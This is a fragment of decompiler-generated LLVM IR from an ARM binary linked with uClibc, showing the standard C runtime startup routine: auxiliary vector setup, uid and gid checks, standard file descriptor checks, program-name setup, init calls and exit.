dec_label_pc_11284:                               ; preds = %dec_label_pc_11278
  store i32 %v1_11284, i32* @r4, align 4
  store i32 %v2_11260, i32* @r5, align 4
  %v1_112a830 = inttoptr i32 %v1_11284 to i32*
  %v2_112a831 = load i32, i32* %v1_112a830, align 4
  store i32 %v2_112a831, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_112ac33 = icmp eq i32 %v2_112a831, 0
  store i1 %v2_112ac33, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_112ac33, label %dec_label_pc_112b4, label %dec_label_pc_11290

dec_label_pc_11290:                               ; preds = %dec_label_pc_11284, %dec_label_pc_112a8
  %v4_11298 = phi i32 [ %v1_112a4, %dec_label_pc_112a8 ], [ %v1_11284, %dec_label_pc_11284 ]
  %v5_11294 = phi i32 [ %v2_112a8, %dec_label_pc_112a8 ], [ %v2_112a831, %dec_label_pc_11284 ]
  %v2_11290 = icmp ugt i32 %v5_11294, 13
  store i1 %v2_11290, i1* %cpsr_c.global-to-local, align 1
  %v7_11290 = icmp eq i32 %v5_11294, 14
  store i1 %v7_11290, i1* %cpsr_z.global-to-local, align 1
  %v2_11294 = xor i1 %v2_11290, true
  %v3_11294 = or i1 %v7_11290, %v2_11294
  br i1 %v3_11294, label %bb78, label %bb79

bb78:                                             ; preds = %dec_label_pc_11290
  %v4_11294 = load i32, i32* @r5, align 4
  %v6_11294 = and i32 %v5_11294, 536870912
  %v7_11294 = icmp ne i32 %v6_11294, 0
  store i1 %v7_11294, i1* %cpsr_c.global-to-local, align 1
  %v8_11294 = mul i32 %v5_11294, 8
  %v9_11294 = add i32 %v4_11294, %v8_11294
  store i32 %v9_11294, i32* %r0.global-to-local, align 4
  br label %bb79

bb79:                                             ; preds = %dec_label_pc_11290, %bb78
  %v1_112a0 = phi i1 [ %v2_11290, %dec_label_pc_11290 ], [ %v7_11294, %bb78 ]
  %v2_11298 = xor i1 %v1_112a0, true
  %v3_11298 = or i1 %v7_11290, %v2_11298
  br i1 %v3_11298, label %bb80, label %dec_label_pc_112a8

bb80:                                             ; preds = %bb79
  store i32 %v4_11298, i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_112a8

dec_label_pc_112a8:                               ; preds = %bb79, %bb80
  call void @__pseudo_cond_branch(i1 %v3_11298, i32 ptrtoint (i32* @global_var_d5a0.705 to i32))
  %v0_112a4 = load i32, i32* @r4, align 4
  %v1_112a4 = add i32 %v0_112a4, 8
  store i32 %v1_112a4, i32* @r4, align 4
  %v1_112a8 = inttoptr i32 %v1_112a4 to i32*
  %v2_112a8 = load i32, i32* %v1_112a8, align 4
  store i32 %v2_112a8, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_112ac = icmp eq i32 %v2_112a8, 0
  store i1 %v2_112ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_112ac, label %dec_label_pc_112b4, label %dec_label_pc_11290

dec_label_pc_112b4:                               ; preds = %dec_label_pc_112a8, %dec_label_pc_11284
  store i32 %v2_11260, i32* %r0.global-to-local, align 4
  %v1_112b8 = call i32 @_dl_aux_init(i32 %v2_11260)
  store i32 %v1_112b8, i32* %r0.global-to-local, align 4
  %v1_112bc = call i32 @__GI___uClibc_init(i32 %v1_112b8)
  store i32 %v1_112bc, i32* @r0, align 4
  store i32 156, i32* %r3.global-to-local, align 4
  %v2_112c4 = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_112c4, i32* @lr, align 4
  store i32 %tmp66, i32* @r2, align 4
  %v2_112cc = add i32 %v2_112c4, 156
  %v3_112cc = inttoptr i32 %v2_112cc to i32*
  %v4_112cc = load i32, i32* %v3_112cc, align 4
  store i32 %v4_112cc, i32* %r1.global-to-local, align 4
  store i32 %tmp65, i32* @r3, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_112d4 = icmp eq i32 %tmp66, 0
  store i1 %v2_112d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_112d4, label %bb81, label %bb82

bb81:                                             ; preds = %dec_label_pc_112b4
  store i32 4096, i32* @r2, align 4
  br label %bb82

bb82:                                             ; preds = %dec_label_pc_112b4, %bb81
  %v0_112e0 = phi i32 [ %tmp66, %dec_label_pc_112b4 ], [ 4096, %bb81 ]
  %v3_112dc = icmp eq i32 %tmp65, -1
  store i1 %v3_112dc, i1* %cpsr_c.global-to-local, align 1
  %v8_112dc = icmp eq i32 %tmp65, -1
  store i1 %v8_112dc, i1* %cpsr_z.global-to-local, align 1
  %v2_112e0 = inttoptr i32 %v4_112cc to i32*
  store i32 %v0_112e0, i32* %v2_112e0, align 4
  br i1 %v3_112dc, label %dec_label_pc_112e8, label %dec_label_pc_11310

dec_label_pc_112e8:                               ; preds = %bb82
  %v0_112e8 = call i32 @getuid()
  store i32 %v0_112e8, i32* @r0, align 4
  store i32 %v0_112e8, i32* %r4.global-to-local, align 4
  %v0_112f0 = call i32 @geteuid()
  store i32 %v0_112f0, i32* @r0, align 4
  %v3_112f4 = icmp uge i32 %v0_112e8, %v0_112f0
  store i1 %v3_112f4, i1* %cpsr_c.global-to-local, align 1
  %v9_112f4 = icmp eq i32 %v0_112e8, %v0_112f0
  store i1 %v9_112f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_112f4, label %dec_label_pc_112fc, label %dec_label_pc_11338

dec_label_pc_112fc:                               ; preds = %dec_label_pc_112e8
  %v1_112fc = call i32 @getgid(i32 %v0_112f0)
  store i32 %v1_112fc, i32* @r0, align 4
  store i32 %v1_112fc, i32* %r4.global-to-local, align 4
  %v0_11304 = call i32 @getegid()
  store i32 %v0_11304, i32* %r0.global-to-local, align 4
  %v3_11308 = icmp uge i32 %v1_112fc, %v0_11304
  store i1 %v3_11308, i1* %cpsr_c.global-to-local, align 1
  %v9_11308 = icmp eq i32 %v1_112fc, %v0_11304
  store i1 %v9_11308, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_11308, label %dec_label_pc_11310, label %dec_label_pc_11338

dec_label_pc_11310:                               ; preds = %dec_label_pc_112fc, %bb82
  store i32 %tmp65, i32* @r2, align 4
  store i1 %v3_112dc, i1* %cpsr_c.global-to-local, align 1
  store i1 %v8_112dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_112dc, label %dec_label_pc_11360, label %dec_label_pc_1131c

dec_label_pc_1131c:                               ; preds = %dec_label_pc_11310
  store i32 %tmp64, i32* @r3, align 4
  %v3_11320 = icmp uge i32 %tmp65, %tmp64
  store i1 %v3_11320, i1* %cpsr_c.global-to-local, align 1
  %v9_11320 = icmp eq i32 %tmp65, %tmp64
  store i1 %v9_11320, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_11320, label %dec_label_pc_11328, label %dec_label_pc_11338

dec_label_pc_11328:                               ; preds = %dec_label_pc_1131c
  store i32 %tmp63, i32* @r2, align 4
  store i32 %tmp62, i32* @r3, align 4
  %v3_11330 = icmp uge i32 %tmp63, %tmp62
  store i1 %v3_11330, i1* %cpsr_c.global-to-local, align 1
  %v9_11330 = icmp eq i32 %tmp63, %tmp62
  store i1 %v9_11330, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_11330, label %dec_label_pc_11360, label %dec_label_pc_11338

dec_label_pc_11338:                               ; preds = %dec_label_pc_1131c, %dec_label_pc_112fc, %dec_label_pc_112e8, %dec_label_pc_11328
  store i32 32770, i32* @r4, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 32768, i32* %r1.global-to-local, align 4
  %v2_11344 = call i32 @__check_one_fd(i32 0, i32 32768)
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_1134c = load i32, i32* @r4, align 4
  store i32 %v0_1134c, i32* %r1.global-to-local, align 4
  %v2_11350 = call i32 @__check_one_fd(i32 1, i32 %v0_1134c)
  %v0_11354 = load i32, i32* @r4, align 4
  store i32 %v0_11354, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_1135c = call i32 @__check_one_fd(i32 2, i32 %v0_11354)
  store i32 %v2_1135c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11360

dec_label_pc_11360:                               ; preds = %dec_label_pc_11328, %dec_label_pc_11310, %dec_label_pc_11338
  store i32 %tmp, i32* %r0.global-to-local, align 4
  store i32 1768, i32* %r3.global-to-local, align 4
  %v2_11368 = load i32, i32* %arg3, align 4
  store i32 %v2_11368, i32* %r2.global-to-local, align 4
  %v2_1136c = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_1136c, i32* %r1.global-to-local, align 4
  %v3_11370 = add i32 %v2_1136c, 1768
  %v4_11370 = inttoptr i32 %v3_11370 to i32*
  store i32 %v2_11368, i32* %v4_11370, align 4
  %v0_11374 = load i32, i32* %r0.global-to-local, align 4
  %v1_11374 = inttoptr i32 %v0_11374 to i32*
  %v2_11374 = load i32, i32* %v1_11374, align 4
  store i32 %v2_11374, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11378 = icmp eq i32 %v2_11374, 0
  store i1 %v2_11378, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11378, label %bb84, label %dec_label_pc_11380

dec_label_pc_11380:                               ; preds = %dec_label_pc_11360
  store i32 172, i32* %r3.global-to-local, align 4
  %v0_11384 = load i32, i32* %r1.global-to-local, align 4
  %v2_11384 = add i32 %v0_11384, 172
  %v3_11384 = inttoptr i32 %v2_11384 to i32*
  %v4_11384 = load i32, i32* %v3_11384, align 4
  store i32 %v4_11384, i32* %r3.global-to-local, align 4
  %v2_11388 = inttoptr i32 %v4_11384 to i32*
  store i32 %v2_11374, i32* %v2_11388, align 4
  store i32 47, i32* %r1.global-to-local, align 4
  %v0_11390 = load i32, i32* %r0.global-to-local, align 4
  %v1_11390 = inttoptr i32 %v0_11390 to i32*
  %v2_11390 = load i32, i32* %v1_11390, align 4
  store i32 %v2_11390, i32* %r0.global-to-local, align 4
  %v4_11394 = call i32 @__GI_strrchr(i32 %v2_11390, i32 47, i32 %v2_11368, i32 %v4_11384)
  store i32 %v4_11394, i32* %r0.global-to-local, align 4
  store i32 104, i32* %r3.global-to-local, align 4
  %v2_1139c = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_1139c, i32* %r5.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_113a0 = icmp eq i32 %v4_11394, 0
  store i1 %v2_113a0, i1* %cpsr_z.global-to-local, align 1
  %v2_113a4 = add i32 %v2_1139c, 104
  %v3_113a4 = inttoptr i32 %v2_113a4 to i32*
  %v4_113a4 = load i32, i32* %v3_113a4, align 4
  store i32 %v4_113a4, i32* %r2.global-to-local, align 4
  br i1 %v2_113a0, label %.thread57, label %bb83

.thread57:                                        ; preds = %dec_label_pc_11380
  %v2_113ac58 = inttoptr i32 %v4_113a4 to i32*
  store i32 0, i32* %v2_113ac58, align 4
  br label %bb84

bb83:                                             ; preds = %dec_label_pc_11380
  %v2_113a8 = add i32 %v4_11394, 1
  store i32 %v2_113a8, i32* %r3.global-to-local, align 4
  %v2_113ac = inttoptr i32 %v4_113a4 to i32*
  store i32 %v4_11394, i32* %v2_113ac, align 4
  %v1_113b0 = load i32, i32* %r3.global-to-local, align 4
  %v2_113b0 = load i32, i32* %r2.global-to-local, align 4
  %v3_113b0 = inttoptr i32 %v2_113b0 to i32*
  store i32 %v1_113b0, i32* %v3_113b0, align 4
  br label %bb84

bb84:                                             ; preds = %.thread57, %bb83, %dec_label_pc_11360
  %v2_113c0 = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_113c0, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  %v2_113cc = add i32 %v2_113c0, -12
  store i32 %v2_113cc, i32* %r5.global-to-local, align 4
  store i32 12952, i32* %r3.global-to-local, align 4
  store i32 %arg5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v3_113dc = add i32 %v2_113c0, 12952
  %v4_113dc = inttoptr i32 %v3_113dc to i32*
  store i32 %arg5, i32* %v4_113dc, align 4
  %v0_113f418 = load i32, i32* %r4.global-to-local, align 4
  %v1_113f419 = load i32, i32* %r7.global-to-local, align 4
  %v3_113f421 = icmp uge i32 %v0_113f418, %v1_113f419
  store i1 %v3_113f421, i1* %cpsr_c.global-to-local, align 1
  %v9_113f427 = icmp eq i32 %v0_113f418, %v1_113f419
  store i1 %v9_113f427, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_113f421, label %dec_label_pc_11428.lr.ph, label %dec_label_pc_113e4

dec_label_pc_113e4:                               ; preds = %bb84, %dec_label_pc_113e4
  %v1_113e4 = phi i32 [ %v1_113f0, %dec_label_pc_113e4 ], [ %v0_113f418, %bb84 ]
  %v0_113e4 = load i32, i32* %r5.global-to-local, align 4
  %v2_113e4 = and i32 %v1_113e4, 1073741824
  %v3_113e4 = icmp ne i32 %v2_113e4, 0
  store i1 %v3_113e4, i1* %cpsr_c.global-to-local, align 1
  %v4_113e4 = mul i32 %v1_113e4, 4
  %v5_113e4 = add i32 %v4_113e4, %v0_113e4
  %v6_113e4 = inttoptr i32 %v5_113e4 to i32*
  %v7_113e4 = load i32, i32* %v6_113e4, align 4
  store i32 %v7_113e4, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v7_113e4)
  %v0_113f0 = load i32, i32* %r4.global-to-local, align 4
  %v1_113f0 = add i32 %v0_113f0, 1
  store i32 %v1_113f0, i32* %r4.global-to-local, align 4
  %v1_113f4 = load i32, i32* %r7.global-to-local, align 4
  %v3_113f4 = icmp uge i32 %v1_113f0, %v1_113f4
  store i1 %v3_113f4, i1* %cpsr_c.global-to-local, align 1
  %v9_113f4 = icmp eq i32 %v1_113f0, %v1_113f4
  store i1 %v9_113f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_113f4, label %dec_label_pc_11428.lr.ph, label %dec_label_pc_113e4

dec_label_pc_11428.lr.ph:                         ; preds = %dec_label_pc_113e4, %bb84
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_113fc = icmp eq i32 %v0_11248, 0
  store i1 %v2_113fc, i1* %cpsr_z.global-to-local, align 1
  %v2_11404 = xor i1 %v2_113fc, true
  call void @__pseudo_cond_branch(i1 %v2_11404, i32 %v0_11248)
  store i32 -12, i32* %r2.global-to-local, align 4
  %v2_11410 = load i32, i32* %stack_var_-416, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  store i32 1, i32* @r7, align 4
  %v2_1141c = add i32 %v2_11410, -12
  store i32 %v2_1141c, i32* @r5, align 4
  store i32 0, i32* @r4, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_11428

dec_label_pc_11428:                               ; preds = %dec_label_pc_11428.dec_label_pc_11428_crit_edge, %dec_label_pc_11428.lr.ph
  %v1_11428 = phi i32 [ %v1_11434, %dec_label_pc_11428.dec_label_pc_11428_crit_edge ], [ 0, %dec_label_pc_11428.lr.ph ]
  %v0_11428 = phi i32 [ %v0_11428.pre, %dec_label_pc_11428.dec_label_pc_11428_crit_edge ], [ %v2_1141c, %dec_label_pc_11428.lr.ph ]
  %v2_11428 = and i32 %v1_11428, 1073741824
  %v3_11428 = icmp ne i32 %v2_11428, 0
  store i1 %v3_11428, i1* %cpsr_c.global-to-local, align 1
  %v4_11428 = mul i32 %v1_11428, 4
  %v5_11428 = add i32 %v4_11428, %v0_11428
  %v6_11428 = inttoptr i32 %v5_11428 to i32*
  %v7_11428 = load i32, i32* %v6_11428, align 4
  store i32 %v7_11428, i32* %ip.global-to-local, align 4
  store i32 70708, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v7_11428)
  %v0_11434 = load i32, i32* @r4, align 4
  %v1_11434 = add i32 %v0_11434, 1
  store i32 %v1_11434, i32* @r4, align 4
  %v1_11438 = load i32, i32* @r7, align 4
  %v3_11438 = icmp uge i32 %v1_11434, %v1_11438
  store i1 %v3_11438, i1* %cpsr_c.global-to-local, align 1
  %v9_11438 = icmp eq i32 %v1_11434, %v1_11438
  store i1 %v9_11438, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_11438, label %dec_label_pc_11440, label %dec_label_pc_11428.dec_label_pc_11428_crit_edge

dec_label_pc_11428.dec_label_pc_11428_crit_edge:  ; preds = %dec_label_pc_11428
  %v0_11428.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_11428

dec_label_pc_11440:                               ; preds = %dec_label_pc_11428
  %v2_11444.pre = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_11444.pre, i32* %r0.global-to-local, align 4
  %v2_11448 = add i32 %v2_11444.pre, -102636
  store i32 %v2_11448, i32* %r2.global-to-local, align 4
  store i32 %v2_11448, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11450 = icmp eq i32 %v2_11448, 0
  store i1 %v2_11450, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11450, label %dec_label_pc_11468, label %dec_label_pc_11458

dec_label_pc_11458:                               ; preds = %dec_label_pc_11440
  store i32 70752, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v2_11448)
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_11464 = load i32, i32* %r0.global-to-local, align 4
  %v2_11464 = inttoptr i32 %v1_11464 to i32*
  store i32 0, i32* %v2_11464, align 4
  %v2_1146c.pre = load i32, i32* %stack_var_-416, align 4
  br label %dec_label_pc_11468

dec_label_pc_11468:                               ; preds = %dec_label_pc_11440, %dec_label_pc_11458
  %v2_1146c = phi i32 [ %v2_11444.pre, %dec_label_pc_11440 ], [ %v2_1146c.pre, %dec_label_pc_11458 ]
  store i32 136, i32* %r3.global-to-local, align 4
  store i32 %v2_1146c, i32* %r1.global-to-local, align 4
  %v2_11470 = add i32 %v2_1146c, 136
  %v3_11470 = inttoptr i32 %v2_11470 to i32*
  %v4_11470 = load i32, i32* %v3_11470, align 4
  store i32 %v4_11470, i32* %r2.global-to-local, align 4
  store i32 %v4_11470, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11478 = icmp eq i32 %v4_11470, 0
  store i1 %v2_11478, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11478, label %dec_label_pc_11490, label %dec_label_pc_11480

dec_label_pc_11480:                               ; preds = %dec_label_pc_11468
  store i32 70792, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_11470)
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_1148c = load i32, i32* %r0.global-to-local, align 4
  %v2_1148c = inttoptr i32 %v1_1148c to i32*
  store i32 0, i32* %v2_1148c, align 4
  br label %dec_label_pc_11490

dec_label_pc_11490:                               ; preds = %dec_label_pc_11468, %dec_label_pc_11480
  %v2_11490 = ptrtoint i32* %stack_var_-400 to i32
  store i32 %v2_11490, i32* @r0, align 4
  %v1_11494 = call i32 @_setjmp(i32 %v2_11490)
  store i32 %v1_11494, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11498 = icmp eq i32 %v1_11494, 0
  store i1 %v2_11498, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11498, label %dec_label_pc_114a0, label %dec_label_pc_114ec

dec_label_pc_114a0:                               ; preds = %dec_label_pc_11490
  %v0_114a0 = call i32 @__aeabi_read_tp()
  store i32 %v0_114a0, i32* %r0.global-to-local, align 4
  %v1_114a4 = add i32 %v0_114a0, -1168
  store i32 %v1_114a4, i32* %r2.global-to-local, align 4
  %v2_114ac = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_114ac, i32* %r4.global-to-local, align 4
  store i32 60, i32* %r3.global-to-local, align 4
  %v2_114b8 = add i32 %v2_114ac, 60
  %v3_114b8 = inttoptr i32 %v2_114b8 to i32*
  %v4_114b8 = load i32, i32* %v3_114b8, align 4
  store i32 %v4_114b8, i32* %ip.global-to-local, align 4
  store i32 %v2_11490, i32* %r3.global-to-local, align 4
  %v2_114c8 = add i32 %v0_114a0, -1040
  %v3_114c8 = inttoptr i32 %v2_114c8 to i32*
  store i32 %v2_11490, i32* %v3_114c8, align 4
  store i32 %tmp, i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* %r0.global-to-local, align 4
  %v0_114d4 = load i32, i32* %ip.global-to-local, align 4
  %v1_114d4 = inttoptr i32 %v0_114d4 to i32*
  %v2_114d4 = load i32, i32* %v1_114d4, align 4
  store i32 %v2_114d4, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* %r5.global-to-local, align 4
  call void @__pseudo_branch(i32 %arg1)
  %v0_114e4 = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11588

dec_label_pc_114ec:                               ; preds = %dec_label_pc_11490
  store i32 44, i32* %r3.global-to-local, align 4
  %v2_114f0 = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_114f0, i32* %ip.global-to-local, align 4
  %v2_114f4 = add i32 %v2_114f0, 44
  %v3_114f4 = inttoptr i32 %v2_114f4 to i32*
  %v4_114f4 = load i32, i32* %v3_114f4, align 4
  store i32 %v4_114f4, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_114f4)
  store i32 128, i32* %r3.global-to-local, align 4
  %v2_11504 = load i32, i32* %stack_var_-416, align 4
  %v2_11508 = add i32 %v2_11504, 128
  %v3_11508 = inttoptr i32 %v2_11508 to i32*
  %v4_11508 = load i32, i32* %v3_11508, align 4
  store i32 %v4_11508, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1150c

dec_label_pc_1150c:                               ; preds = %dec_label_pc_11540.dec_label_pc_1150c_crit_edge, %dec_label_pc_114ec
  %v0_1150c = phi i32 [ %v0_1150c.pre, %dec_label_pc_11540.dec_label_pc_1150c_crit_edge ], [ %v4_11508, %dec_label_pc_114ec ]
  %v1_1150c = inttoptr i32 %v0_1150c to i32*
  %v2_1150c = load i32, i32* %v1_1150c, align 4
  store i32 %v0_1150c, i32* %r2.global-to-local, align 4
  store i32 %v2_1150c, i32* %r4.global-to-local, align 4
  %v1_11518 = add i32 %v2_1150c, -1
  store i32 %v1_11518, i32* %r1.global-to-local, align 4
  %v2_1151c89 = load i32, i32* %v1_1150c, align 4
  store i32 %v2_1151c89, i32* %r3.global-to-local, align 4
  %v3_1152091 = icmp uge i32 %v2_1151c89, %v2_1150c
  store i1 %v3_1152091, i1* %cpsr_c.global-to-local, align 1
  %v9_1152097 = icmp eq i32 %v2_1151c89, %v2_1150c
  store i1 %v9_1152097, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_1152097, label %dec_label_pc_11528, label %dec_label_pc_11540

dec_label_pc_11528:                               ; preds = %dec_label_pc_1150c, %dec_label_pc_11528.dec_label_pc_1151c_crit_edge
  %v0_1152898 = phi i32 [ %v1_11520.pre, %dec_label_pc_11528.dec_label_pc_1151c_crit_edge ], [ %v2_1150c, %dec_label_pc_1150c ]
  store i32 %v0_1152898, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_11538 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_11538, label %dec_label_pc_1153c, label %dec_label_pc_11528.dec_label_pc_1151c_crit_edge

dec_label_pc_11528.dec_label_pc_1151c_crit_edge:  ; preds = %dec_label_pc_11528
  %v0_1151c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_11520.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_1151c = inttoptr i32 %v0_1151c.pre to i32*
  %v2_1151c = load i32, i32* %v1_1151c, align 4
  store i32 %v2_1151c, i32* %r3.global-to-local, align 4
  %v3_11520 = icmp uge i32 %v2_1151c, %v1_11520.pre
  store i1 %v3_11520, i1* %cpsr_c.global-to-local, align 1
  %v9_11520 = icmp eq i32 %v2_1151c, %v1_11520.pre
  store i1 %v9_11520, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_11520, label %dec_label_pc_11528, label %dec_label_pc_11540

dec_label_pc_1153c:                               ; preds = %dec_label_pc_11528
  %v0_1153c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1153c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_11540

dec_label_pc_11540:                               ; preds = %dec_label_pc_1150c, %dec_label_pc_11528.dec_label_pc_1151c_crit_edge, %dec_label_pc_1153c
  %v0_11548 = phi i32 [ %v0_1153c, %dec_label_pc_1153c ], [ %v2_1151c89, %dec_label_pc_1150c ], [ %v2_1151c, %dec_label_pc_11528.dec_label_pc_1151c_crit_edge ]
  %v1_11540 = phi i32 [ %v0_1153c, %dec_label_pc_1153c ], [ %v2_1150c, %dec_label_pc_1150c ], [ %v1_11520.pre, %dec_label_pc_11528.dec_label_pc_1151c_crit_edge ]
  %v3_11540 = icmp uge i32 %v0_11548, %v1_11540
  store i1 %v3_11540, i1* %cpsr_c.global-to-local, align 1
  %v9_11540 = icmp eq i32 %v0_11548, %v1_11540
  store i1 %v9_11540, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_11540, label %dec_label_pc_11548, label %dec_label_pc_11540.dec_label_pc_1150c_crit_edge

dec_label_pc_11540.dec_label_pc_1150c_crit_edge:  ; preds = %dec_label_pc_11540
  %v0_1150c.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1150c

dec_label_pc_11548:                               ; preds = %dec_label_pc_11540
  %v2_11548 = icmp ne i32 %v1_11540, 0
  store i1 %v2_11548, i1* %cpsr_c.global-to-local, align 1
  %v7_11548 = icmp eq i32 %v1_11540, 1
  store i1 %v7_11548, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11548, label %dec_label_pc_11588, label %dec_label_pc_11550

dec_label_pc_11550:                               ; preds = %dec_label_pc_11548
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r7.global-to-local, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_11588

dec_label_pc_11588:                               ; preds = %dec_label_pc_11548, %dec_label_pc_11550, %dec_label_pc_114a0
  %storemerge2 = phi i32 [ %v0_114e4, %dec_label_pc_114a0 ], [ 0, %dec_label_pc_11550 ], [ 0, %dec_label_pc_11548 ]
  store i32 %storemerge2, i32* %r1.global-to-local, align 4
  store i32 %storemerge2, i32* %r0.global-to-local, align 4
  %v1_1158c = call i32 @__GI_exit(i32 %storemerge2)
  store i32 %v1_1158c, i32* %r0.global-to-local, align 4
  %v0_11590 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_11590, label %bb85, label %.thread9

bb85:                                             ; preds = %dec_label_pc_11588
  %v1_11590 = load i32, i32* %r1.global-to-local, align 4
  %v5_11590 = mul i32 %v1_1158c, 268435456
  %v6_11590 = and i32 %v1_11590, %v5_11590
  store i32 %v6_11590, i32* %r2.global-to-local, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread9

.thread9:                                         ; preds = %dec_label_pc_11588, %bb85
  %v5_115b0 = phi i32 [ %v1_1158c, %dec_label_pc_11588 ], [ 0, %bb85 ]
  ret i32 %v5_115b0

; uselistorder directives
  uselistorder i32 %v1_1158c, { 1, 0, 2 }
  uselistorder i32 %storemerge2, { 1, 0, 2 }
  uselistorder i32 %v1_11540, { 1, 0, 2, 3 }
  uselistorder i32 %v0_1153c, { 1, 0, 2 }
  uselistorder i32 %v1_11520.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_1150c, { 1, 0 }
  uselistorder i32 %v2_1146c, { 1, 0 }
  uselistorder i32 %v2_11444.pre, { 2, 0, 1 }
  uselistorder i32 %v1_11438, { 1, 0 }
  uselistorder i32 %v1_11434, { 3, 2, 1, 0 }
  uselistorder i32 %v1_11428, { 1, 0 }
  uselistorder i32 %v1_113f4, { 1, 0 }
  uselistorder i32 %v1_113f0, { 1, 2, 3, 0 }
  uselistorder i32 %v1_113e4, { 1, 0 }
  uselistorder i32 %v2_113c0, { 1, 0, 2 }
  uselistorder i32 %v4_113a4, { 1, 0, 2 }
  uselistorder i32 %v4_11394, { 1, 0, 2, 3 }
  uselistorder i1 %v8_112dc, { 1, 2, 0 }
  uselistorder i32 %v2_112a8, { 1, 2, 0 }
  uselistorder i32 %v1_112a4, { 1, 2, 0 }
  uselistorder i1 %v2_11290, { 1, 0, 2 }
  uselistorder i32 %v5_11294, { 1, 0, 2, 3 }
  uselistorder i32 %v2_11260, { 1, 0, 2, 3 }
  uselistorder i32 %v0_11248, { 1, 0, 2 }
  uselistorder i32 %v2_1123c, { 1, 0, 2 }
  uselistorder i32 %v3_1120c, { 1, 0 }
  uselistorder i32* %stack_var_-416, { 2, 3, 4, 0, 1, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32 %tmp65, { 1, 2, 5, 0, 3, 4 }
  uselistorder i32 %tmp64, { 2, 1, 0 }
  uselistorder i32 %tmp63, { 2, 1, 0 }
  uselistorder i32 %tmp62, { 2, 1, 0 }
  uselistorder i32* %r7.global-to-local, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2, 3, 4, 6, 5, 7, 8, 9, 10, 11, 12, 13, 14 }
  uselistorder i32* %r3.global-to-local, { 4, 6, 5, 0, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 3, 26, 27, 28, 1, 2 }
